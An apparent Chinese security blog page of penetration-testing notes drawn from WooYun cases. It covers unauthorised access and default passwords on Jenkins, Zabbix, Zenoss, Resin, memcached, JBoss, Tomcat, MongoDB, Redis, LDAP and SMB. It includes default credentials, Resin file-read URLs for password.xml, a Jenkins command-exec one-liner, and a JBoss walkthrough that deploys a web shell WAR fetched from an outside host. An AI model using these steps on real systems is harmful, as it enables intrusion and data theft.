+<h1 id="17-Ganglia系统监控信息泄露"><a href="#17-Ganglia系统监控信息泄露" class="headerlink" title="17 Ganglia系统监控信息泄露 "></a>17 Ganglia系统监控信息泄露 </h1><p>Ganglia是UC<br>Berkeley发起的一个开源集群监视项目，设计用于测量数以千计的节点。Ganglia的核心包含gmond、gmetad以及一个web前段。主要用来监控系统性能，如cpu、mem、硬盘利用率、I/O负载、网络流量情况等，通过曲线很容易见到每个节点的工作状态，对合理调整、分配系统资源，提高系统整体性能起到重要作用。</p>
+<p>工作原理：</p>
+<p>Ganglia包括如下几个程序，他们之间通过XDR(xml的压缩格式)或者XML格式传递监控数据，达到监控效果。集群内的节点，通过运行gmond收集发布节点状态信息，然后gmetad周期性的轮询gmond收集到的信息，然后存入rrd数据库，通过web服务器可以对其进行查询展示。</p>
+<h2 id="17-1-漏洞利用"><a href="#17-1-漏洞利用" class="headerlink" title="17.1 漏洞利用 "></a>17.1 漏洞利用 </h2><p>可以查看公司内部流量信息、被监控主机的配置信息及运行状态。</p>
+<p>开放端口：8649<br>（不确定，案例中还有开放8000）</p>
+<ul>
+<li><p>直接在浏览器地址栏输入IP:8649 eg:<br><a target="_blank" rel="noopener" href="http://xx.xx.xxx.xx:8649/">http://xx.xx.xxx.xx:8649/</a></p>
+</li>
+<li><p>直接访问域名：ganglia.xx.com</p>
+</li>
+<li><p>使用nc查看： nc.exe iii.com<br>8649 |more</p>
+</li>
+</ul>
+<h1 id="18-j2ee应用架构（web服务器搭配不当）"><a href="#18-j2ee应用架构（web服务器搭配不当）" class="headerlink" title="18 j2ee应用架构（web服务器搭配不当） "></a>18 j2ee应用架构（web服务器搭配不当） </h1><p>drops.wooyun.org/papers/60</p>
+<p>在通常的web应用中会将多个web服务器搭配着使用，以解决其中某台服务器的性能缺陷、负载均衡及完成一些分层结构的安全策略等。较常见的如：Nginx+Tomcat的分层结构</p>
+<p>Nginx：高性能的HTTP和反向代理服务器。通过它可以解决一些静态资源(图片、js、css等类型的文件)访问处理。</p>
+<p>Tomcat：免费开放源代码的j2ee<br>Web服务器。其性能缺陷：处理静态资源特别是图片文件时特别吃力。</p>
+<h2 id="18-1-漏洞成因"><a href="#18-1-漏洞成因" class="headerlink" title="18.1 漏洞成因 "></a>18.1 漏洞成因 </h2><p>由于处理方式或分层架构设计，如果对静态资源的目录或文件的映射配置不当，就会引发安全问题(特别是在j2ee应用中)。</p>
+<p>Tomcat的WEB-INF目录(每个j2ee的web应用部署文件默认包含该目录)，在tomcat中该目录禁止访问，包含以下内容：</p>
+<p>classes目录：包含该应用核心的java类编译后的class文件及部分配置文件；</p>
+<p>lib目录：所有框架、插件和组件的架包；</p>
+<p>web.xml目录：重要配置文件。(展开攻击的一把钥匙)</p>
+<p>Nginx在解析静态文件时，把web-inf目录映射进去，若没有做nginx相关安全配置或由于nginx自身缺陷影响，将导致通过nginx访问到tomcat的web-inf目录。</p>
+<p>通常，只配置nginx把与j2ee及开发架或自定义框架有关的url(例如：.jsp<br>、.do、.action…等)交给tomcat，剩下的大部分后缀类型的url直接交给nginx处理(包括web-inf中比较重要的.xml、class等类型)。</p>
+<h2 id="18-2-漏洞利用"><a href="#18-2-漏洞利用" class="headerlink" title="18.2 漏洞利用 "></a>18.2 漏洞利用 </h2><p>该问题普遍存在于大型站点应用中，由于j2ee应用自身的一些特性，例如：起点配置文件web.xml（/WEB-IINF/web.xml），若先找到它并结合j2ee的xml路径配置特点，就可以找到其他的配置文件(需进行反编译)，甚至获得整个应用的所有核心代码及应用架构的相关信息。</p>
+<h2 id="18-3-修复方案"><a href="#18-3-修复方案" class="headerlink" title="18.3 修复方案 "></a>18.3 修复方案 </h2><ul>
+<li><p>最好不要映射非静态文件目录或敏感目录；</p>
+</li>
+<li><p>修改nginx配置文件，禁止访问WEB-INF文件<br>:<code>Location ~ ^/WEB-INF/* &#123;deny all;&#125;</code></p>
+</li>
+</ul>
+<h1 id="19-Jenkins平台未设置登录验证"><a href="#19-Jenkins平台未设置登录验证" class="headerlink" title="19 Jenkins平台未设置登录验证 "></a>19 Jenkins平台未设置登录验证 </h1><p>Jenkins是基于java开发的一种持续集成工具，用于监控持续重复的工作，功能包括：(1)持续的软件版本发布/测试项目；(2)监控外部调用执行的工作。</p>
+<h2 id="19-1-漏洞利用"><a href="#19-1-漏洞利用" class="headerlink" title="19.1 漏洞利用 "></a>19.1 漏洞利用 </h2><ul>
+<li>未授权访问，可直接执行命令 wooyun-2013-028803</li>
+</ul>
+<p>直接在url中访问： eg:<br><a href="http://xx.xx.xx.xx:8080(http://xx.xx.xx.xx:8080/)">http://xx.xx.xx.xx:8080(http://xx.xx.xx.xx:8080/)</a><br>(端口视具体情况而定，案例中有3000、8888)</p>
+<ul>
+<li> <a target="_blank" rel="noopener" href="http://ip/script">http://ip/script</a></li>
+</ul>
+<p>java.lang.Runtime.getRuntime().exec(‘id’).getText();<br>行脚本并回显一句话</p>
+<h1 id="20-zabbix默认口令"><a href="#20-zabbix默认口令" class="headerlink" title="20 zabbix默认口令 "></a>20 zabbix默认口令 </h1><h2 id="20-1-基础知识"><a href="#20-1-基础知识" class="headerlink" title="20.1 基础知识 "></a>20.1 基础知识 </h2><p>Zabbix除了监控功能强大之处，还可以在忘记root密码的时候重置服务器root密码。（这也是一个超级后门）</p>
+<p>此外，system.run模块可以执行任意指令（agent在root权限下，不过一般都开启该权限）</p>
+<h2 id="20-2-利用方式"><a href="#20-2-利用方式" class="headerlink" title="20.2 利用方式 "></a>20.2 利用方式 </h2><p>弱口令进入后台： <a target="_blank" rel="noopener" href="http://ip/zabbix/">http://ip/zabbix/</a> admin / zabbix</p>
+<p>攻击方法：</p>
+<ul>
+<li><p>尝试system.run执行命令</p>
+</li>
+<li><p>获取zabbix server shell：</p>
+</li>
+</ul>
+<p>Administrator——&gt;Scripts——&gt;修改Commands(例如改为<br>uname -a)</p>
+<p>Monitoring——&gt;Last data——&gt;点击Zabbix<br>server，执行调用命令</p>
+<h1 id="21-zenoss默认口令"><a href="#21-zenoss默认口令" class="headerlink" title="21 zenoss默认口令 "></a>21 zenoss默认口令 </h1><h2 id="21-1-基本知识"><a href="#21-1-基本知识" class="headerlink" title="21.1 基本知识 "></a>21.1 基本知识 </h2><p>Zenoss<br>Core是开源企业级IT管理软件-智能监控软件，允许IT管理员依靠单一的WEB控制台来监控网络架构的状态和健康度。Zenoss同时也是开源的网络与系统管理软件。</p>
+<h2 id="21-2-漏洞利用"><a href="#21-2-漏洞利用" class="headerlink" title="21.2 漏洞利用 "></a>21.2 漏洞利用 </h2><p>ip:8080 admin / zenoss</p>
+<p>ip:8080/zport/dmd/Dashboard</p>
+<p>zenoss有一个commands功能，可以执行指令将指令修改为自己需要的即可），然后选中一台机器执行指令。</p>
+<p>在wooyun上所见到的案例中，最令人头疼的也最难理解的是：</p>
+<ul>
+<li><p>wooyun-2013-019917 反弹获取shell</p>
+</li>
+<li><p>wooyun-2013-019917<br>边界神器py版开启socks代理</p>
+</li>
+</ul>
+<p>（zone.wooyun.org/content/1693）</p>
+<ul>
+<li> wooyun-2013-019917<br>端口转发（将代理端口转发到公网）</li>
+</ul>
+<h1 id="22-Resin任意文件读取"><a href="#22-Resin任意文件读取" class="headerlink" title="22 Resin任意文件读取 "></a>22 Resin任意文件读取 </h1><h2 id="22-1-基本知识"><a href="#22-1-基本知识" class="headerlink" title="22.1 基本知识 "></a>22.1 基本知识 </h2><p>Resin：java应用服务器</p>
+<p>CAUCHO公司产品，是一个非常流行的application server<br>，对server和JSP提供良好的支持，速度非常快直逼APACHE<br>SERVER。Resin支持负载均衡，可以增加web站点的可靠性。</p>
+<h2 id="22-2-漏洞利用"><a href="#22-2-漏洞利用" class="headerlink" title="22.2 漏洞利用 "></a>22.2 漏洞利用 </h2><p>Resin的某个CGI程序实现上存在输入验证漏洞，远程攻击者可能利用此漏洞读取Web主目录下的任意文件。</p>
+<ul>
+<li>任意文件读取：</li>
+</ul>
+<p>配置文件：</p>
+<p><a target="_blank" rel="noopener" href="http://ip/resin-doc/examples/ico-periodictask/viewfile?file=WEB-INF/web.xml">http://ip/resin-doc/examples/ico-periodictask/viewfile?file=WEB-INF/web.xml</a></p>
+<p>读取源码：</p>
+<p><a target="_blank" rel="noopener" href="http://ip/resin-doc/examples/ico-periodictask/viewfile?file=index.xtp">http://ip/resin-doc/examples/ico-periodictask/viewfile?file=index.xtp</a></p>
+<p>读取password.xml</p>
+<p>ip/resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/password.xml</p>
+<ul>
+<li>resin文件包含漏洞shell (wooyun-2013-023139)</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://ip/Resin-doc/viewfile/?contextpath=C:%5C%5C&amp;servletpath=&amp;file=boot.ini">http://ip/Resin-doc/viewfile/?contextpath=C:\\&amp;servletpath=&amp;file=boot.ini</a></p>
+<ul>
+<li>resin弱口令</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://ip/resin-admin/status.php">http://ip/resin-admin/status.php</a> admin / admin</p>
+<ul>
+<li>resin版本过低，导致磁盘信息泄露</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://ip/c:/">http://ip/c:/</a></p>
+<h2 id="22-3-实例演练"><a href="#22-3-实例演练" class="headerlink" title="22.3 实例演练 "></a>22.3 实例演练 </h2><p><a target="_blank" rel="noopener" href="http://www.xx.cn/c:/">http://www.xx.cn/c:/</a> （wooyun-2013-041338）</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_c53a22d32c38834b.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_6a5593fbd445e703.png"></p>
+<h1 id="23-memcache未限制访问IP"><a href="#23-memcache未限制访问IP" class="headerlink" title="23 memcache未限制访问IP "></a>23 memcache未限制访问IP </h1><h2 id="23-1-基础知识"><a href="#23-1-基础知识" class="headerlink" title="23.1 基础知识 "></a>23.1 基础知识 </h2><p>Memcached是一个高性能的分布式内存对象缓存系统，用于动态web应用以减轻数据库负载。它通过内存缓存数据和对象来减少读取数据库的次数，从而提高动态、数据库驱动网站的速度。Memcached基于一个存储键/值对的hashmap。其守护进程是用C写的，但是客户端可以用任何语言来编写，并通过memcached协议与守护进程通信。</p>
+<h2 id="23-2-漏洞利用"><a href="#23-2-漏洞利用" class="headerlink" title="23.2 漏洞利用 "></a>23.2 漏洞利用 </h2><p>Memcached未限制IP导致cache泄露<br>服务默认端口：11211</p>
+<ul>
+<li>使用nc 反弹查看数据：</li>
+</ul>
+<p>nc.exe –vv ip 11211</p>
+<p>ip: inverse host lookup failed: h_errno 11004: NO_DATA</p>
+<p>(UNKNOWN) [ip] 11211 (?) open</p>
+<p>stats items</p>
+<p>STAT items:4:number 1544729</p>
+<p>…….</p>
+<ul>
+<li>memcached空口令访问 可以直接telnet登陆<br>wooyun-2010-0123604</li>
+</ul>
+<ul>
+<li>root@kali:~# nc ip 11211</li>
+</ul>
+<h2 id="23-3-实战演练"><a href="#23-3-实战演练" class="headerlink" title="23.3 实战演练 "></a>23.3 实战演练 </h2><p>root@Aerfa:~# nc -vv xx.xx.xx.xx 11211</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_ba1df478b9b7aee9.png"></p>
+<p>root@Aerfa:~# nc -vv yy.yy.yy.yy 11211</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_df926128a0be01ea.png"></p>
+<h1 id="24-Jboss配置不当"><a href="#24-Jboss配置不当" class="headerlink" title="24 Jboss配置不当 "></a>24 Jboss配置不当 </h1><p>drops.wooyun.org/papers/178</p>
+<h2 id="24-1-基本信息"><a href="#24-1-基本信息" class="headerlink" title="24.1 基本信息 "></a>24.1 基本信息 </h2><p>Jboss基于J2EE的开放源代码的应用服务器（JAVA应用服务器），是一个管理EJB的容器和服务器（Jboss企业中间件JEMS的一部分），其核心服务不包括service/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
+<p>Jboss应用服务框架：</p>
+<ul>
+<li>Java管理扩展（JMX）：监控管理java应用程序的标准化架构，分为三层：</li>
+</ul>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_7ca4d6381121d244.png"></p>
+<p>设备层（instrumentation）：定义信息模型。</p>
+<p>代理层（Agent）：定义各种服务以及通信模型，所有的管理构件都需要向他注册。</p>
+<p>分布服务层（distribute）：定义能对代理层进行操作的管理接口和构件。</p>
+<ul>
+<li>JMX<br>Invoker：允许客户端应用程序发送任意协议的JMX请求到服务端</li>
+</ul>
+<p>这些请求都是用MBean服务器发送到响应的Mbean服务</p>
+<ul>
+<li>Deployer架构：</li>
+</ul>
+<p>JAR（Java<br>Archives），用于压缩、发布、部署和封装库、组件、程序插件。</p>
+<p>WAR（Web<br>ARchives），JAR文件包含一个Web应用程序的组件。</p>
+<h2 id="24-2-漏洞利用"><a href="#24-2-漏洞利用" class="headerlink" title="24.2 漏洞利用 "></a>24.2 漏洞利用 </h2><ul>
+<li>WAR文件 </li>
+</ul>
+<p>在Jboss应用服务器上最简单的运行代码方式是部署一个组件，可以通过HTTP安装组件，war文件包需要在web-inf目录下包含一个web.xml文件。War文件可以使用java的SDK<br>jar命令创建。</p>
+<ul>
+<li>JMX Console</li>
+</ul>
+<p>web-console</p>
+<p>jmx-console</p>
+<p>invoker/JMXInvokerServlet</p>
+<p>JMX控制台允许通过web浏览器与Jboss应用服务器直接互动的组件，方便管理Jboss服务器，Mbean的属性与方法可以直接调用。</p>
+<p>JMX控制台通常是攻击的第一目标，Mbeans的属性（Server和ServerInfo）展现了Jboss应用服务器与主机系统的信息，包含java虚拟机以及操作系统的类型版本信息。</p>
+<p>Mbean的shutdown()方法可以关闭Jboss应用服务器，未授权的JMX接口可以导致拒绝服务攻击。</p>
+<p>War包的部署，执行shell命令。</p>
+<ul>
+<li>Jboss弱口令</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://ip/admin-console">http://IP/admin-console</a> admin / admin</p>
+<h2 id="24-3-实例应用"><a href="#24-3-实例应用" class="headerlink" title="24.3 实例应用 "></a>24.3 实例应用 </h2><p><a target="_blank" rel="noopener" href="http://yy.yy.yy.yy:8080/web-console/">http://yy.yy.yy.yy:8080/web-console/</a> 未授权访问</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_8e55e3f044ed0364.png"></p>
+<p>先下载java插件，再控制面板中找到java，设置java控制面板的安全属性，添加例外网站。</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_90d6709742b78542.png"></p>
+<h3 id="lt-1-gt-admin-console-getshell"><a href="#lt-1-gt-admin-console-getshell" class="headerlink" title="&lt;1&gt; admin-console getshell"></a>&lt;1&gt; admin-console getshell</h3><p><a target="_blank" rel="noopener" href="http://yy.yy.yy.yy/admin-console/">http://yy.yy.yy.yy/admin-console/</a> 无效</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_28bdb02a0cb5a373.png"></p>
+<h3 id="lt-2-gt-jmx-console-getshell"><a href="#lt-2-gt-jmx-console-getshell" class="headerlink" title="&lt;2&gt; jmx-console getshell"></a>&lt;2&gt; jmx-console getshell</h3><p><a target="_blank" rel="noopener" href="http://yy.yy.yy.yy/jmx-console/">http://yy.yy.yy.yy/jmx-console/</a> 存在</p>
+<p>需要将war包或jsp shell放到服务器上<br><a target="_blank" rel="noopener" href="http://p2j.cn/is.war">http://p2j.cn/is.war</a></p>
+<p>jboss.deployment——&gt;void addURL</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_d6a528da8f01270e.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_fa352df195521efa.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_5acfb48291d0131b.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_b4b2160d26750158.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_cc69a4e856862c50.png"></p>
+<p>上传成功，但是文件访问不存在</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_6201bba2e6c4598.png"></p>
+<h3 id="lt-3-gt-web-console-getshell"><a href="#lt-3-gt-web-console-getshell" class="headerlink" title="&lt;3&gt; web-console getshell"></a>&lt;3&gt; web-console getshell</h3><p><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx/web-console/">http://xx.xx.xx.xx/web-console/</a> 存在</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_15bb592501eaeab4.png"></p>
+<h3 id="lt-41-gt-invoker-getshell"><a href="#lt-41-gt-invoker-getshell" class="headerlink" title="&lt;41&gt; invoker getshell"></a>&lt;41&gt; invoker getshell</h3><p>inovker接口未配置认证信息</p>
+<p>yy.yy.yy.yy/invoker/JMXInvokerServlet</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_51cd584709c21a49.png"></p>
+<p>案例<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-0121861">http://www.wooyun.org/bugs/wooyun-2010-0121861</a>中使用curl命令：</p>
+<p>curl <a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-0121861">http://www.wooyun.org/bugs/wooyun-2010-0121861</a></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_ce74e6ffdf131681.png"></p>
+<p>查看系统名称：</p>
+<p>C:\Users\Aerfa&gt;java -jar c:/jboss_exploit_fat.jar -i<br><a target="_blank" rel="noopener" href="http://yy.yy.yy.yy/invoker/JMXInvokerServlet">http://yy.yy.yy.yy/invoker/JMXInvokerServlet</a> get jboss.system:type=ServerInfo OSName</p>
+<p>Windows 2003</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_228e2132d6117e7e.png"></p>
+<p>查看系统版本</p>
+<p>C:\Users\Aerfa&gt;java -jar c:/jboss_exploit_fat.jar -i<br><a target="_blank" rel="noopener" href="http://yy.yy.yy.yy/invoker/JMXInvokerServlet">http://yy.yy.yy.yy/invoker/JMXInvokerServlet</a> get jboss.system:type=ServerInfo OSVersion</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_520647a32422e3a2.png"></p>
+<p>远程部署war包（失败）</p>
+<p>C:\Users\Aerfa&gt;java -jar c:/jboss_exploit_fat.jar -i<br><a target="_blank" rel="noopener" href="http://yy.yy.yy.yy/invoker/JMXInvokerServlet">http://yy.yy.yy.yy/invoker/JMXInvokerServlet</a> invoke jboss.system:service=MainDeployer deploy<br><a target="_blank" rel="noopener" href="http://p2j.cn/is.war">http://p2j.cn/is.war</a></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_f6f6157ae371b472.png"></p>
+<p><a target="_blank" rel="noopener" href="http://ts-spsoft.sgst.cn/is/?cmd.jsp?pwd=023&cmd=ls">http://yy.yy.yy.yy/is/?cmd.jsp?pwd=023&amp;cmd=ls</a><br>访问shell是失败</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_9f1eec4d60316f17.png"></p>
+<h1 id="25-测试机外网可访问"><a href="#25-测试机外网可访问" class="headerlink" title="25 测试机外网可访问 "></a>25 测试机外网可访问 </h1><p>测试机处于外网环境内，存在很多安全问题。比如wooyun案例中的弱口令、java环境管理软件未授权访问、…..<br>此部分不好做归纳，故略过。</p>
+<h1 id="26-padding-oracle-attack"><a href="#26-padding-oracle-attack" class="headerlink" title="26 padding oracle attack "></a>26 padding oracle attack </h1><h2 id="26-1-基础知识"><a href="#26-1-基础知识" class="headerlink" title="26.1 基础知识 "></a>26.1 基础知识 </h2><p>Padding指数据“填充”</p>
+<p>对于<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/155969.htm">加密算法</a>来说，它们是基于等长的“<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/702806.htm">数据块</a>”进行操作的（如对于RC2，DES或TripleDES算法来说这个长度是8字节(<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/60408.htm)%EF%BC%8C%E8%80%8C%E5%AF%B9%E4%BA%8ERijndael%E7%AE%97%E6%B3%95%E6%9D%A5%E8%AF%B4%E5%88%99%E6%98%AF16%E3%80%8124%E6%88%9632%E5%AD%97%E8%8A%82%EF%BC%89%E3%80%82%E4%BD%86%E6%98%AF%EF%BC%8C%E6%88%91%E4%BB%AC%E7%9A%84%E8%BE%93%E5%85%A5%E6%95%B0%E6%8D%AE%E9%95%BF%E5%BA%A6%E6%98%AF%E4%B8%8D%E8%A7%84%E5%88%99%E7%9A%84%EF%BC%8C%E5%9B%A0%E6%AD%A4%E5%BF%85%E7%84%B6%E9%9C%80%E8%A6%81%E8%BF%9B%E8%A1%8C%E2%80%9C%E5%A1%AB%E5%85%85(http://baike.baidu.com/view/542735.htm)%E2%80%9D%E6%89%8D%E8%83%BD%E5%BD%A2%E6%88%90%E5%AE%8C%E6%95%B4%E7%9A%84%E2%80%9C%E5%9D%97%E2%80%9D%E3%80%82%E2%80%9C%E5%A1%AB%E5%85%85%E2%80%9D%E6%97%B6%E6%AF%94%E8%BE%83%E5%B8%B8%E7%94%A8%E7%9A%84%E6%98%AFPKCS">http://baike.baidu.com/view/60408.htm)，而对于Rijndael算法来说则是16、24或32字节）。但是，我们的输入数据长度是不规则的，因此必然需要进行“填充(http://baike.baidu.com/view/542735.htm)”才能形成完整的“块”。“填充”时比较常用的是PKCS</a><br>#5规则，简单地说，便是根据最后一个数据块(<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/702806.htm)%E6%89%80%E7%BC%BA%E5%B0%91%E7%9A%84%E9%95%BF%E5%BA%A6%E6%9D%A5%E9%80%89%E6%8B%A9%E5%A1%AB%E5%85%85%E7%9A%84%E5%86%85%E5%AE%B9%E3%80%82">http://baike.baidu.com/view/702806.htm)所缺少的长度来选择填充的内容。</a></p>
+<h2 id="26-2-漏洞利用"><a href="#26-2-漏洞利用" class="headerlink" title="26.2 漏洞利用 "></a>26.2 漏洞利用 </h2><p>略过，乌云上有案例。</p>
+<h1 id="27-tomcat弱口令"><a href="#27-tomcat弱口令" class="headerlink" title="27 tomcat弱口令 "></a>27 tomcat弱口令 </h1><h2 id="27-1-基础知识"><a href="#27-1-基础知识" class="headerlink" title="27.1 基础知识 "></a>27.1 基础知识 </h2><p>不再提及。</p>
+<h2 id="27-2-漏洞利用"><a href="#27-2-漏洞利用" class="headerlink" title="27.2 漏洞利用 "></a>27.2 漏洞利用 </h2><p>弱密码：</p>
+<p><a target="_blank" rel="noopener" href="http://www.xxxx.com:8080/manager/html">http://www.xxxx.com:8080/manager/html</a> tomcat:tomcat</p>
+<p><a target="_blank" rel="noopener" href="http://www.xxxx.com:8080/manager/html">http://www.xxxx.com:8080/manager/html</a> admin:admin</p>
+<h1 id="28-phpmyadmin弱口令"><a href="#28-phpmyadmin弱口令" class="headerlink" title="28 phpmyadmin弱口令 "></a>28 phpmyadmin弱口令 </h1><p>略</p>
+<h1 id="29-MongoDB配置不当"><a href="#29-MongoDB配置不当" class="headerlink" title="29 MongoDB配置不当 "></a>29 MongoDB配置不当 </h1><p>drops.wooyun.org/papers/850</p>
+<h2 id="29-1-基本介绍"><a href="#29-1-基本介绍" class="headerlink" title="29.1 基本介绍 "></a>29.1 基本介绍 </h2><p>略</p>
+<h2 id="29-2-未授权访问"><a href="#29-2-未授权访问" class="headerlink" title="29.2 未授权访问 "></a>29.2 未授权访问 </h2><p>默认数据库 admin</p>
+<p>用户密码和密码均为空</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_af31540eed427f60.png"></p>
+<h2 id="29-3-实战演练"><a href="#29-3-实战演练" class="headerlink" title="29.3 实战演练 "></a>29.3 实战演练 </h2><p>yy.yy.yy.yy:27017<br>博苑家_幼儿园教育信息化平台</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_933d6e56d127adb.png"></p>
+<h1 id="30-各种敏感后台对外开放"><a href="#30-各种敏感后台对外开放" class="headerlink" title="30 各种敏感后台对外开放 "></a>30 各种敏感后台对外开放 </h1><p>一般“奇葩”端口web访问可见。</p>
+<h1 id="31-Django配置不当致信息泄露"><a href="#31-Django配置不当致信息泄露" class="headerlink" title="31 Django配置不当致信息泄露 "></a>31 Django配置不当致信息泄露 </h1><p>Django设置debug = True<br>，将报错信息返回至浏览页面，从而导致信息泄露</p>
+<h1 id="32-Redis未授权访问"><a href="#32-Redis未授权访问" class="headerlink" title="32 Redis未授权访问 "></a>32 Redis未授权访问 </h1><p>Port: 6379</p>
+<p>一般不需要认证，可直接访问</p>
+<h2 id="32-1-基础知识"><a href="#32-1-基础知识" class="headerlink" title="32.1 基础知识 "></a>32.1 基础知识 </h2><p>Redis是一个NoSQL的数据库，数据通过键/值对存储在内存中。默认配置中，默认开放没有认证的TCP/6379端口。</p>
+<p>和memcached类似，支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)和zset(有序集合)。与memcached不同之处在于，可以随时执行“save”命令将当前redis的数据保存到硬盘，此外redis也会根据配置自动存储数据到硬盘上。</p>
+<p>其中RDB就像数据库备份文件</p>
+<p>AOF则是一个log日志文件</p>
+<h2 id="32-2-利用方式"><a href="#32-2-利用方式" class="headerlink" title="32.2 利用方式 "></a>32.2 利用方式 </h2><ul>
+<li>Kali下：</li>
+</ul>
+<p>redis-cli -h xx.com</p>
+<ul>
+<li><p>使用软件： Redis Desktop Manager</p>
+</li>
+<li><p>利用redis未授权访问漏洞getshell【<a target="_blank" rel="noopener" href="http://www.secpulse.com/archives/5357.html%E3%80%91">www.secpulse.com/archives/5357.html】</a></p>
+<ul>
+<li><p>开启web服务</p>
+</li>
+<li><p>网站物理路径</p>
+</li>
+<li><p>www目录可写（root权限）</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="32-3-实战演练"><a href="#32-3-实战演练" class="headerlink" title="32.3 实战演练 "></a>32.3 实战演练 </h2><p>xx科技有限公司</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_83a0c3790ea4b0cf.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_f0a10558018436fa.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_29c9a47e91a7ef0a.png"></p>
+<h1 id="33-LDAP未授权访问"><a href="#33-LDAP未授权访问" class="headerlink" title="33 LDAP未授权访问 "></a>33 LDAP未授权访问 </h1><p>Port: 389<br>WooYun-2015-92789(<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2015-092789">http://www.wooyun.org/bugs/wooyun-2015-092789</a>)</p>
+<h2 id="33-1-基础知识"><a href="#33-1-基础知识" class="headerlink" title="33.1 基础知识 "></a>33.1 基础知识 </h2><p>Lightweight Directory Access<br>Protocol，轻量目录访问协议，是一种在线目录访问协议，主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。</p>
+<h2 id="33-2-利用方式"><a href="#33-2-利用方式" class="headerlink" title="33.2 利用方式 "></a>33.2 利用方式 </h2><p>使用LDAP Admin进行登陆</p>
+<h2 id="33-3-应用实例"><a href="#33-3-应用实例" class="headerlink" title="33.3 应用实例 "></a>33.3 应用实例 </h2><p>zz.zz.zz.zz</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_63de4b8b96d21dcd.png"></p>
+<h1 id="34-SMB弱口令"><a href="#34-SMB弱口令" class="headerlink" title="34 SMB弱口令 "></a>34 SMB弱口令 </h1><p>Port: 445</p>
+<h2 id="34-1-smb字典"><a href="#34-1-smb字典" class="headerlink" title="34.1 smb字典 "></a>34.1 smb字典 </h2><h2 id="34-2-MS08-067溢出"><a href="#34-2-MS08-067溢出" class="headerlink" title="34.2 MS08-067溢出 "></a>34.2 MS08-067溢出 </h2><p><a target="_blank" rel="noopener" href="http://www.2cto.com/Article/201308/237265.html">http://www.2cto.com/Article/201308/237265.html</a></p>
